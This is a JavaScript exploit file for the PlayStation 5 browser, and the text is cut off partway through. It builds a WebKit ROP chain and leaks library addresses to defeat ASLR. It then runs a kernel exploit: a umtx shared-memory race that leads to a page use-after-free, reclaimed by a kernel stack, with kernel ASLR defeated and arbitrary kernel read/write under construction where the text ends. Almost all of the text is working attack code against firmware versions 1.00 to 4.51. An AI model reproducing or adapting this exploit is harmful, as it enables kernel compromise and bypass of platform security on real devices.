//Common chain
let chain;
//Bases
let libSceNKWebKitBase;
let libSceLibcInternalBase;
let libKernelBase;
//ASLR defeat patsy (former vtable buddy)
let textArea = document.createElement("textarea");

if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

const supportedFirmwares = ["1.00","1.02","1.05", "1.10", "1.11", "1.12", "1.13", "1.14", "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "3.00", "3.10", "3.20", "3.21", "4.00", "4.02", "4.03", "4.50", "4.51"];
const fw_idx = navigator.userAgent.indexOf('PlayStation; PlayStation 5/') + 27;
const fw_str = navigator.userAgent.substring(fw_idx, fw_idx + 4);
window.fw_float = parseFloat(fw_str);
document.getElementById("current-fw").innerHTML = "Current firmware: " + fw_str;

//load offsets & webkit exploit after.
if (!supportedFirmwares.includes(fw_str)) {
    alert(`This firmware(${fw_str}) is not supported.`);
    throw new Error("");
}

let nogc = [];
let syscalls = {};
let gadgets = {};


let worker = new Worker("rop_slave.js");

//Make sure worker is alive?
async function wait_for_worker() {
    let p1 = await new Promise((resolve) => {
        const channel = new MessageChannel();
        channel.port1.onmessage = () => {
            channel.port1.close();
            resolve(1);
        }
        worker.postMessage(0, [channel.port2]);
    });
    return p1;
}

function find_worker() {

    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    alert("failed to find worker.");
}

function print(string) {
    document.getElementById("console").innerHTML += string + "\n";
    document.getElementById("console").scrollTop = document.getElementById("console").scrollHeight;
}

async function userland() {
    p.pre_chain = pre_chain;
    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc_dump = malloc_dump;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;
    p.writestr = writestr;

    //pointer to vtable address
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    let textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate libSceNKWebKitBase
    libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    //debug_log("webkit base: 0x" + libSceNKWebKitBase);

    libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    //debug_log("libkernel base: 0x" + libKernelBase);

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(0x10000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x10000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint32Array(0x1000);
        let og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function u8array_from_address(addr, size) {
        let og_array = new Uint8Array(0x10000 + size);
        let og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        nogc.push(bufView);
        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr) {
        let str = "";
        for (let i = 0; ; i++) {
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    await wait_for_worker();
    let worker_stack = find_worker();
    let original_context = p.malloc(0x40);

    let return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {
        //save context for later
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {
        //Restore earlier saved context but with a twist.
        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        //overwrite rop_slave's return address
        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);

        let p1 = await new Promise((resolve) => {
            const channel = new MessageChannel();
            channel.port1.onmessage = () => {
                channel.port1.close();
                resolve(1);
            }
            worker.postMessage(0, [channel.port2]);
        });
        if (p1 === 0) {
            alert("The rop thread ran away. ");
            p.write8(0, 0);
        }
    }

    function debug_bin(bin) {
        let xhr = new XMLHttpRequest();
        xhr.open('POST', 'a.bin', false);
        xhr.setRequestHeader('Content-Type', 'application/octet-stream');
        xhr.send(bin);
    }

    chain = new worker_rop();

    async function pin_to_core(core) {
        let level = 3;
        let which = 1;
        let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
        let setsize = 0x10;
        let mask = p.malloc(0x10);
        p.write2(mask, 1 << core);

        return await chain.syscall(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    function thread_pin_to_core(thread, core) {
        let level = 3;
        let which = 1;
        let id = new int64(0xFFFFFFFF, 0xFFFFFFFF);
        let setsize = 0x10;
        let mask = p.malloc(0x10);
        p.write2(mask, 1 << core);

        thread.self_healing_syscall(SYS_PS4_CPUSET_SETAFFINITY, level, which, id, setsize, mask);
    }

    async function set_rtprio(prio) {
        let rtprio = p.malloc(0x4);
        p.write2(rtprio.add32(0x0), 0x2);
        p.write2(rtprio.add32(0x2), prio);

        return await chain.syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
    }

    async function thread_set_rtprio(thread, prio) {
        let rtprio = p.malloc(0x4);
        p.write2(rtprio.add32(0x0), 0x2);
        p.write2(rtprio.add32(0x2), prio);

        thread.self_healing_syscall(SYS_RTPRIO_THREAD, 1, 0, rtprio);
    }

    async function sleep(secs) {
        return await chain.call(libKernelBase.add32(OFFSET_lk_sleep), secs); // sleep 1s
    }

    async function nanosleep(nsecs) {
        let nanosleep_args = p.malloc(0x10);
        p.write8(nanosleep_args.add32(0x00), 0);     // tv_sec
        p.write8(nanosleep_args.add32(0x08), nsecs); // tv_nsec
        return await chain.syscall(SYS_NANOSLEEP, nanosleep_args, nanosleep_args);
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // KERNEL EXPLOIT BEGINS
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    ///////////////////////////////////////////////////////////////////////
    // Setup
    ///////////////////////////////////////////////////////////////////////

    // Define consts
    let UMTX_OP_SHM         = 26; // 25 on BSD
    let UMTX_SHM_CREAT      = 0x0001;
    let UMTX_SHM_LOOKUP     = 0x0002;
    let UMTX_SHM_DESTROY    = 0x0004;

    // Create a UMTX key area to use, these just have to be valid pointers
    let shm_key = p.malloc(0x100);

    /*
     * Thread setup:
     * 11 - main thread (core 11, high prio) 
     * 13 - destroyer 0 (core 13, high prio)
     * 14 - destroyer 1 (core 14, high prio)
     * 15 - lookup (core 15, low prio)
     */
    const cfg_thread_main           = {core: 11, prio: 256};
    const cfg_thread_destroyer_0    = {core: 13, prio: 256};
    const cfg_thread_destroyer_1    = {core: 14, prio: 256};
    const cfg_thread_lookup         = {core: 15, prio: 767};

    // Pin main thread to core 1 with high prio
    await pin_to_core(cfg_thread_main.core);
    await set_rtprio(cfg_thread_main.prio);

    debug_log("[+] main thread on cpu=0x" + await chain.call(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu)));

    // Get pid for searching for this process later
    let our_pid = await chain.syscall(SYS_GETPID);
    debug_log("[+] pid=0x" + our_pid);

    // Create pipe for read/write prim via stack reads/writes
    const pipe_size         = 0x10000;
    let pipe_slow_fds       = p.malloc(0x8);
    let pipe_scratch_buf    = p.malloc(0x10000);
    await chain.syscall(SYS_PIPE2, pipe_slow_fds, 0);

    let pipe_slow_read_fd   = p.read4(pipe_slow_fds.add32(0x0));
    let pipe_slow_write_fd  = p.read4(pipe_slow_fds.add32(0x4));
    //debug_log("[+] created slow pipe 0x" + pipe_slow_read_fd.toString(16) + " <-> 0x" + pipe_slow_write_fd.toString(16));

    /*
     * Variables for kernel prim thread communication
     */
    let kprim_thread_data_neo_found = p.malloc(0x8);
    p.write8(kprim_thread_data_neo_found, 0);
    let kprim_thread_data_neo = p.malloc(0x8);
    p.write8(kprim_thread_data_neo, new int64(0xFFFFFFFF, 0xFFFFFFFF));
    let kprim_thread_data_reset = p.malloc(0x8);
    p.write8(kprim_thread_data_reset, 0);

    let kprim_thread_data_cmd           = p.malloc(0x8);
    p.write8(kprim_thread_data_cmd, 0);
    let kprim_thread_data_uaddr         = p.malloc(0x8);
    let kprim_thread_data_kaddr         = p.malloc(0x8);

    let kprim_thread_data_read_counter  = p.malloc(0x8);
    p.write8(kprim_thread_data_read_counter, 0);

    let kprim_thread_data_write_counter = p.malloc(0x8);
    p.write8(kprim_thread_data_write_counter, 0);

    let kprim_thread_data_exit_bmp      = p.malloc(0x20 * 0x8);

    const KPRIM_NOP   = 0;
    const KPRIM_READ  = 1;
    const KPRIM_WRITE = 2;

    // Add threads for kernel primitives post-UAF
    let kprim_threads = [];
    let kprim_read_size = 0x8;
    for (let i = 0; i < 0x20; i++) {
        let thr = new thread_rop("kprim" + i, 0x1000, 0x200); {
            thread_pin_to_core(thr, cfg_thread_lookup.core);

            const label_waitforcmdorstop = thr.get_rsp();

            // If the one thread has been found that reclaimed, we must exit if we're not the one
            const cond_neofound    = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_neo_found, 1);
            const label_neocheck   = thr.get_rsp();
            const cond_neocheck    = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_neo, i);

            // This syscall does nothing except create a cookie in the stack so we know which thread
            // reclaimed the UAF'd page
            const label_do_cookie  = thr.get_rsp();
            thr.self_healing_syscall(SYS_SCHED_YIELD, 0x13370000 + i);
            const cond_waitforcmd  = thr.create_branch(thr.branch_types.ABOVE, kprim_thread_data_cmd, KPRIM_NOP);

            const label_checkread  = thr.get_rsp();
            const cond_checkread   = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_cmd, KPRIM_READ);
            const label_read = thr.get_rsp();
            thr.increment_dword(kprim_thread_data_read_counter);
            thr.self_healing_syscall(SYS_WRITE, pipe_slow_write_fd, pipe_scratch_buf, kprim_read_size);

            const label_checkwrite = thr.get_rsp();
            const cond_checkwrite  = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_cmd, KPRIM_WRITE);
            const label_write = thr.get_rsp();
            thr.increment_dword(kprim_thread_data_write_counter);
            thr.self_healing_syscall(SYS_READ, pipe_slow_read_fd, pipe_scratch_buf, kprim_read_size);

            const label_waitreset  = thr.get_rsp();
            const cond_waitreset   = thr.create_branch(thr.branch_types.EQUAL, kprim_thread_data_reset, 1);
            const label_reset      = thr.get_rsp();
            thr.jmp_to_rsp(label_waitforcmdorstop);

            const label_exit = thr.get_rsp();
            thr.push_write8(kprim_thread_data_exit_bmp.add32(i * 0x8), 1);
            //thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0x11223344);

            thr.set_branch_points(cond_neofound, label_neocheck, label_do_cookie);
            thr.set_branch_points(cond_neocheck, label_do_cookie, label_exit);
            thr.set_branch_points(cond_waitforcmd, label_checkread, label_waitforcmdorstop);
            thr.set_branch_points(cond_checkread, label_read, label_checkwrite);
            thr.set_branch_points(cond_checkwrite, label_write, label_waitreset);
            thr.set_branch_points(cond_waitreset, label_reset, label_waitreset);
        }

        kprim_threads.push(thr);
    }

    // Var for telling all threads to start running
    let thread_data_run_all = p.malloc(0x8);
    p.write8(thread_data_run_all, 0);

    // Var for threads to update to indicate readiness (3=go time)
    let thread_data_ready = p.malloc(0x8);
    p.write8(thread_data_ready, 0);

    // Var for allowing threads to restart
    let thread_data_reset_all = p.malloc(0x8);
    p.write8(thread_data_reset_all, 0);

    // Destroyer 0 data
    let thread_data_destroyer_0_run = p.malloc(0x8);
    let thread_data_destroyer_0_stop = p.malloc(0x8);
    let thread_data_destroyer_0_counter = p.malloc(0x8);
    let thread_data_destroyer_0_cpu = p.malloc(0x8);
    p.write8(thread_data_destroyer_0_counter, 0);

    // Destroyer 1 data
    let thread_data_destroyer_1_run = p.malloc(0x8);
    let thread_data_destroyer_1_stop = p.malloc(0x8);
    let thread_data_destroyer_1_counter = p.malloc(0x8);
    let thread_data_destroyer_1_cpu = p.malloc(0x8);
    p.write8(thread_data_destroyer_1_counter, 0);

    // Lookup data
    let thread_data_lookup_run = p.malloc(0x8);
    let thread_data_lookup_stop = p.malloc(0x8);
    let thread_data_lookup_counter = p.malloc(0x8);
    let thread_data_lookup_cpu = p.malloc(0x8);
    let thread_data_lookup_fd = p.malloc(0x8);
    p.write8(thread_data_lookup_counter, 0);
    p.write4(thread_data_lookup_fd, 0x13371337);

    function stop_all_threads() {
        p.write8(thread_data_destroyer_0_stop, 1);
        p.write8(thread_data_destroyer_1_stop, 1);
        p.write8(thread_data_lookup_stop, 1);
    }

    let thread_destroyer_0 = new thread_rop("rop_thread_destroyer0"); {
        thread_pin_to_core(thread_destroyer_0, cfg_thread_destroyer_0.core);
        thread_set_rtprio(thread_destroyer_0, cfg_thread_destroyer_0.prio);
        thread_destroyer_0.fcall(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        thread_destroyer_0.write_result(thread_data_destroyer_0_cpu);

        // Labels/code
        const label_a    = thread_destroyer_0.get_rsp();
        const cond_stop  = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_destroyer_0_stop, 1);

        const label_b    = thread_destroyer_0.get_rsp();
        const cond_run   = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_run_all, 1);

        const label_c    = thread_destroyer_0.get_rsp();
        thread_destroyer_0.increment_dword(thread_data_ready);
        const label_wait = thread_destroyer_0.get_rsp();
        const cond_ready = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_ready, 3);

        const label_d    = thread_destroyer_0.get_rsp();
        thread_destroyer_0.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key);
        thread_destroyer_0.increment_dword(thread_data_destroyer_0_counter);

        const label_waitreset = thread_destroyer_0.get_rsp();
        const cond_waitreset = thread_destroyer_0.create_branch(thread_destroyer_0.branch_types.EQUAL, thread_data_reset_all, 1);
        const label_restart = thread_destroyer_0.get_rsp();
        thread_destroyer_0.jmp_to_rsp(label_a);

        const label_e    = thread_destroyer_0.get_rsp();

        // Set branch points
        thread_destroyer_0.set_branch_points(cond_stop, label_e, label_b);
        thread_destroyer_0.set_branch_points(cond_run, label_c, label_a);
        thread_destroyer_0.set_branch_points(cond_ready, label_d, label_wait);
        thread_destroyer_0.set_branch_points(cond_waitreset, label_restart, label_waitreset);
    }

    let thread_destroyer_1 = new thread_rop("rop_thread_destroyer1"); {
        thread_pin_to_core(thread_destroyer_1, cfg_thread_destroyer_1.core);
        thread_set_rtprio(thread_destroyer_1, cfg_thread_destroyer_1.prio);
        thread_destroyer_1.fcall(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        thread_destroyer_1.write_result(thread_data_destroyer_1_cpu);

        // Labels/code
        const label_a    = thread_destroyer_1.get_rsp();
        const cond_stop  = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_destroyer_1_stop, 1);

        const label_b    = thread_destroyer_1.get_rsp();
        const cond_run   = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_run_all, 1);

        const label_c    = thread_destroyer_1.get_rsp();
        thread_destroyer_1.increment_dword(thread_data_ready);
        const label_wait = thread_destroyer_1.get_rsp();
        const cond_ready = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_ready, 3);

        const label_d    = thread_destroyer_1.get_rsp();
        thread_destroyer_1.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, shm_key);
        thread_destroyer_1.increment_dword(thread_data_destroyer_1_counter);

        const label_waitreset = thread_destroyer_1.get_rsp();
        const cond_waitreset = thread_destroyer_1.create_branch(thread_destroyer_1.branch_types.EQUAL, thread_data_reset_all, 1);
        const label_restart = thread_destroyer_1.get_rsp();
        thread_destroyer_1.jmp_to_rsp(label_a);

        const label_e    = thread_destroyer_1.get_rsp();

        // Set branch points
        thread_destroyer_1.set_branch_points(cond_stop, label_e, label_b);
        thread_destroyer_1.set_branch_points(cond_run, label_c, label_a);
        thread_destroyer_1.set_branch_points(cond_ready, label_d, label_wait);
        thread_destroyer_1.set_branch_points(cond_waitreset, label_restart, label_waitreset);
    }

    let thread_lookup = new thread_rop("rop_thread_lookup"); {
        thread_pin_to_core(thread_lookup, cfg_thread_lookup.core);
        thread_set_rtprio(thread_lookup, cfg_thread_lookup.prio);
        thread_lookup.fcall(libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
        thread_lookup.write_result(thread_data_lookup_cpu);

        // Labels/code
        const label_a   = thread_lookup.get_rsp();
        const cond_stop = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_lookup_stop, 1);

        const label_b   = thread_lookup.get_rsp();
        const cond_run  = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_run_all, 1);

        const label_c   = thread_lookup.get_rsp();
        thread_lookup.increment_dword(thread_data_ready);
        const label_wait = thread_lookup.get_rsp();
        const cond_ready = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_ready, 3);

        const label_d   = thread_lookup.get_rsp();
        thread_lookup.self_healing_syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_LOOKUP, shm_key);
        thread_lookup.write_result(thread_data_lookup_fd);
        //thread_lookup.push_write8(thread_data_lookup_fd, new int64(0x45454545, 0x46464646));
        thread_lookup.increment_dword(thread_data_lookup_counter);

        const label_waitreset = thread_lookup.get_rsp();
        const cond_waitreset = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_reset_all, 1);
        const label_restart = thread_lookup.get_rsp();
        thread_lookup.jmp_to_rsp(label_a);

        const label_e   = thread_lookup.get_rsp();

        // Set branch points
        thread_lookup.set_branch_points(cond_stop, label_e, label_b);
        thread_lookup.set_branch_points(cond_run, label_c, label_a);
        thread_lookup.set_branch_points(cond_ready, label_d, label_wait);
        thread_lookup.set_branch_points(cond_waitreset, label_restart, label_waitreset);
    }

    // Create threads (they will hang on waiting for run flag)
    var pthread_destroyer_0 = await thread_destroyer_0.spawn_thread();
    var pthread_destroyer_1 = await thread_destroyer_1.spawn_thread();
    var pthread_lookup = await thread_lookup.spawn_thread();

    await sleep(1);

    debug_log("[+] destroyer0 (cpu=0x" + p.read8(thread_data_destroyer_0_cpu) + "), destroyer1 (cpu=0x" + p.read8(thread_data_destroyer_1_cpu) + "), lookup (cpu=0x" + p.read8(thread_data_lookup_cpu) + ")");

    ///////////////////////////////////////////////////////////////////////
    // Stage 1: Trigger race
    ///////////////////////////////////////////////////////////////////////

    async function umtx_shm_create(key) {
        let ret = await chain.syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, key);
        return ret;
    }

    async function umtx_shm_destroy(key) {
        let ret = await chain.syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, key);
        return ret;
    }

    async function shm_resize_tag(fd) {
        let ret = await chain.syscall(SYS_FTRUNCATE, fd, (fd.low  * 0x1000));
        return ret;
    }

    async function shm_close(fd) {
        let ret = await chain.syscall(SYS_CLOSE, fd);
        return ret;
    }

    async function check_shm_for_tagged_size(fd, original_fd) {
        let OFFSET_STAT_SIZE = 0x48;

        if (fd.low == 0xFFFFFFFF)
            return -1;

        let stat = p.malloc(0x100);
        let ret = await chain.syscall(SYS_FSTAT, fd, stat);

        //debug_log("check_shm_for_tagged_size: fstat=0x" + ret + ", size=0x" + p.read8(stat.add32(OFFSET_STAT_SIZE)));
        let tag = p.read8(stat.add32(OFFSET_STAT_SIZE)).low / 0x1000;
        //debug_log("check_shm_for_tagged_size: tag=0x" + tag.toString(16) + " | fd=0x" + fd.low.toString(16) + " | orig_fd=0x" + original_fd.low.toString(16));

        if (ret.low == 0 && tag != fd.low && tag != original_fd.low) {
            debug_log("[+] overlapped shm regions! tag=0x" + tag.toString(16));
            return tag;
        }

        return -1;
    }

    let winner_fd = -1;
    let lookup_fd = -1;
    for (let attempt = 1; attempt < 0x1000; attempt++) {
        let original_fd = await umtx_shm_create(shm_key.add32(0x0));
        //debug_log("[+] [" + attempt + "] original_fd=0x" + original_fd);
        let main_fd = original_fd;

        let truncate_ret = await shm_resize_tag(main_fd);
        let close_ret = await shm_close(main_fd);

        p.write8(thread_data_ready, 0);
        p.write8(thread_data_reset_all, 0);
        p.write8(thread_data_run_all, 1);

        for (;;) {
            if (p.read8(thread_data_ready).low == 3) {
                //debug_log("[+] ready threads: " + p.read8(thread_data_ready));
                p.write8(thread_data_run_all, 0);
                break;
            }

            await sleep(1);
        }

        // Migrate to destroyer 0 core and reclaim
        await pin_to_core(cfg_thread_destroyer_0.core);
        let destroyer_0_fd = await umtx_shm_create(shm_key.add32(0x8));
        //debug_log("[+] [" + attempt + "] destroyer 0 fd=0x" + destroyer_0_fd);
        await umtx_shm_destroy(shm_key.add32(0x8));

        // Migrate to destroyer 1 core and reclaim
        await pin_to_core(cfg_thread_destroyer_1.core);
        let destroyer_1_fd = await umtx_shm_create(shm_key.add32(0x8));
        //debug_log("[+] [" + attempt + "] destroyer 1 fd=0x" + destroyer_1_fd);
        await umtx_shm_destroy(shm_key.add32(0x8));

        // Migrate back to main core
        await pin_to_core(cfg_thread_main.core);

        // Resize shm regions
        truncate_ret = await shm_resize_tag(destroyer_0_fd);
        //debug_log("[+] [" + attempt + "] tried resize=0x" + truncate_ret + " on fd=0x" + destroyer_0_fd);
        truncate_ret = await shm_resize_tag(destroyer_1_fd);
        //debug_log("[+] [" + attempt + "] tried resize=0x" + truncate_ret + " on fd=0x" + destroyer_1_fd);

        // Wait on all counters
        while (p.read8(thread_data_destroyer_0_counter).low != attempt) {}
        while (p.read8(thread_data_destroyer_1_counter).low != attempt) {}
        while (p.read8(thread_data_lookup_counter).low != attempt) {}

        // Check if we won the race
        let thr_lookup_fd = p.read8(thread_data_lookup_fd);
        // HACK: sonys code is shit, so we need to account for the fact that ESRCH can be returned without setting error flag
        if (thr_lookup_fd.low == 3)
            thr_lookup_fd = new int64(0xffffffff, 0xffffffff);

        winner_fd = await check_shm_for_tagged_size(thr_lookup_fd, original_fd);

        // Cleanup other fds
        if (winner_fd != destroyer_0_fd.low)
            await shm_close(destroyer_0_fd);
        if (winner_fd != destroyer_1_fd.low)
            await shm_close(destroyer_1_fd);

        if (winner_fd >= 0) {
            //debug_log("[+] d0=" + p.read8(thread_data_destroyer_0_counter) + ", d1=" + p.read8(thread_data_destroyer_1_counter) + ", l=" + p.read8(thread_data_lookup_counter));
            debug_log("[+] [" + attempt + "] breaking out of loop, we have won the race");
            lookup_fd = thr_lookup_fd.low;
            break;
        } else {
            //debug_log("[+] d0=" + p.read8(thread_data_destroyer_0_counter) + ", d1=" + p.read8(thread_data_destroyer_1_counter) + ", l=" + p.read8(thread_data_lookup_counter));
        }

        // Reset all threads for another try
        p.write8(thread_data_reset_all, 1);
    }

    if (winner_fd >= 0)
        debug_log("[+] lookup=0x" + lookup_fd.toString(16) + ", winner=0x" + winner_fd.toString(16));
    else {
        debug_log("[!] failed to win race, retry");
        return;
    }

    ///////////////////////////////////////////////////////////////////////
    // Stage 2: Get page UAF
    ///////////////////////////////////////////////////////////////////////

    let spray_key = p.malloc(0x80);
    for (let i = 0; i < 0x20; i++) {
        await umtx_shm_create(spray_key.add32(i * 4));
    }

    // Run a chain to close the winning FD and map on the lookup FD to get a page UAF
    let results = p.malloc(0x10);
    chain.add_syscall(SYS_CLOSE, winner_fd);
    chain.write_result(results.add32(0x0));
    chain.add_syscall(SYS_MMAP, 0, 0x4000, 0x3, 0x1, lookup_fd, 0);
    chain.write_result(results.add32(0x8));

    // Reclaim UAF page with a kernel stack
    for (let td of kprim_threads) {
        td.spawn_thread_chain();
    }

    //alert("going to run");
    await chain.run();

    let close_res = p.read8(results.add32(0x0));
    let kstack = p.read8(results.add32(0x8));
    debug_log("[+] close=0x" + close_res + ", kstack=0x" + kstack);

    if (kstack.low == 0xFFFFFFFF) {
        debug_log("[!] failed to map kstack, retry");
        return;
    }

    
    // Code to dump kernel stack to PC to look for good pointers
    /*let data = new Uint8Array(0x1000);
    for(let titer = 0x0; titer < 0x1000; titer++) {
        data[titer] = p.read1(kstack.add32(0x3000+titer));
    }
    debug_bin(data);
    alert("sent");*/

    let kptr        = p.read8(kstack.add32(0x3000 + OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET));
    let kbase       = 0
    let kdata_base  = 0;
    if (OFFSET_KERNEL_SYS_SCHED_YIELD_RET != 0xDEADC0DE) {
        kbase = kptr.sub32(OFFSET_KERNEL_SYS_SCHED_YIELD_RET);
        kdata_base = kbase.add32(OFFSET_KERNEL_DATA);
        debug_log("[+] defeated aslr, kernel base: 0x" + kbase + " (kdata base: 0x" + kdata_base + ")");
    }

    // Find the thread that reclaimed and destroy others
    let cookie = p.read8(kstack.add32(0x3000 + OFFSET_KERNEL_STACK_COOKIE)).low;
    debug_log("[+] found kstack, cookie=0x" + cookie.toString(16));

    if ((cookie >> 16) != 0x1337) {
        debug_log("[!] bad cookie, retry");
        return;
    }

    let kprim_thread_id = cookie & 0xFFFF;
    p.write8(kprim_thread_data_neo, kprim_thread_id);
    p.write8(kprim_thread_data_neo_found, 1);

    await sleep(4);

    for (let i = 0; i < 0x20; i++) {
        let bmp_offset = i * 0x8;
        let is_exited = p.read8(kprim_thread_data_exit_bmp.add32(bmp_offset)).low;
        if (is_exited != 1 && i != kprim_thread_id) {
            debug_log("[!] unexpected thread behavior, thread 0x" + i.toString(16) + " is not the one");
        }
    }

    stop_all_threads();

    ///////////////////////////////////////////////////////////////////////
    // Stage 3: Kernel arbitrary read/write via pipe+stack
    ///////////////////////////////////////////////////////////////////////

    async function send_cmd_to_kprim_thread(cmd, uaddr, kaddr) {
        // Take the thread out of reset
        p.write8(kprim_thread_data_reset, 0);

        // Set args
        p.write8(kprim_thread_data_uaddr, uaddr);
        p.write8(kprim_thread_data_kaddr, kaddr);
        //p.write8(kprim_thread_data_len, len);

        // Set command, we do this last because it kickstarts the thread to do stuff
        p.write8(kprim_thread_data_cmd, cmd);

        await nanosleep(10000000); // 10ms
        //debug_log("[+] kprim send (" + cmd + ", 0x" + uaddr + ", 0x" + kaddr + ") read=0x" + p.read8(kprim_thread_data_read_counter) + ", write=0x" + p.read8(kprim_thread_data_write_counter));

        // Command is done, clear the command and put the thread into reset
        p.write8(kprim_thread_data_cmd, KPRIM_NOP);
        p.write8(kprim_thread_data_reset, 1);
    }

    function update_iov_in_kstack(orig_iov_base, new_iov_base, uio_segflg, is_write) {
        let OFFSET_IOV_BASE     = 0x00;
        let OFFSET_IOV_LEN      = 0x08;
        let SIZE_IOV            = 0x10;
        let OFFSET_UIO_IOV      = 0x00;
        let OFFSET_UIO_IOVCNT   = 0x08;
        let OFFSET_UIO_OFFSET   = 0x10;
        let OFFSET_UIO_RESID    = 0x18;
        let OFFSET_UIO_SEGFLG   = 0x20;
        let OFFSET_UIO_RW       = 0x24;
